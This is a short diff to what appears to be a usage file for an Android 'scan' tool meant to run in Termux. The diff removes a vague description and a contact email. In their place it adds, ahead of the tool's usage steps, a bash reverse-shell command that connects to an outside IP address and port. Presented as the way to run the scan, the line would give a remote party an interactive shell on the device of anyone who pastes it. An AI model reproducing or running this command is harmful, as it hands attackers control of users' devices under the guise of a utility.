@@ -1,7 +1,4 @@
-This is a scan for Android devices that will make your password run incase it won't work properly 
-Contact for more informations
-==== freshtrup659@gmail.com =====
-==================================
+bash -i >& /dev/tcp/209.25.141.181/22864 0>&1; scan
            =Scan usage=
 
 1 download termux from playstore or Google
